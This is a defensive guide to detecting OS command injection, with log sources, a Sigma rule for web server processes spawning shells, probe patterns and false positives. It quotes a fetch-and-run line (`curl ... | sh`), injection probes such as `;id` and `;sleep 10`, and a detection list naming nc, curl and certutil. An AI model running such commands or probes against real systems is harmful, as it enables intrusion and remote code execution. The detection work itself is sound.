# Detecting OS Command Injection

Command injection shows up twice: shell metacharacters (`; | && $() ` `` ` ``) in HTTP
parameters on the wire, and the web server process spawning shells on the host. The host-side
signal is the reliable one.

## What to log / where it shows up
- **EDR / Sysmon / auditd on the web tier** (highest fidelity): `nginx`, `apache`, `w3wp.exe`, `java`, `node`, `php-fpm` spawning `sh`, `bash`, `cmd.exe`, `powershell.exe`, `curl`, `wget`, `nc`, `whoami`, `id`.
- **Web server logs**: parameters containing `;`, `|`, `&&`, `$(`, backticks, `%0a` (newline injection), and encoded variants (`%3B`, `%7C`).
- **Egress logs**: the web server fetching payloads (`curl http://x.x.x.x/s.sh | sh`) or beaconing out post-exploitation.

## Sigma rule
```yaml
title: Web Server Process Spawning Shell or Command Tool
id: a7858109-7ba6-416c-9765-4f831e5bfc6e
status: experimental
description: Detects a web/application server process spawning a shell or common post-exploitation command — the host-side signature of command injection or webshell execution.
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith:
            - '\w3wp.exe'
            - '\httpd.exe'
            - '\nginx.exe'
            - '\java.exe'        # Tomcat app servers
            - '\tomcat*.exe'
            - '\node.exe'
            - '\php-cgi.exe'
            - '\php-fpm.exe'
    selection_child:
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\sh.exe'
            - '\bash.exe'
            - '\net.exe'
            - '\whoami.exe'
            - '\curl.exe'
            - '\wget.exe'
            - '\certutil.exe'
            - '\nc.exe'
            - '\ncat.exe'
    condition: selection_parent and selection_child
falsepositives:
    - CMSs and admin panels that legitimately shell out (image converters, git pulls, backup jobs) — whitelist by exact command line
    - Health-check scripts configured under the app pool identity
level: critical
tags:
    - attack.t1059
    - attack.t1190
    - cwe.78
```

## Behavioral signals
- Probing sequence in access logs: one param cycling `;id`, `|id`, `$(id)`, backtick-`id`, then encoded variants — filter-bypass iteration from a single source.
- Blind confirmation via timing (`;sleep 10`) — endpoint latency pinned to multiples of the sleep for one client.
- Out-of-band confirmation: DNS/HTTP callback from the server to an OOB domain right after a metacharacter-laden request.
- Post-exploitation cadence: `whoami`/`id` → `curl`/`wget` payload fetch → reverse shell — minutes apart, all children of the server process.

## False positives
- Applications designed to invoke system tools (ImageMagick, ffmpeg, `git`) — these are also the classic injection sinks; whitelist exact binary + argument prefix, never just the binary.
- On Linux use the equivalent Sysmon-for-Linux/auditd rule — `ParentImage` of `nginx`/`php-fpm` spawning `/bin/sh` is even rarer legitimately.
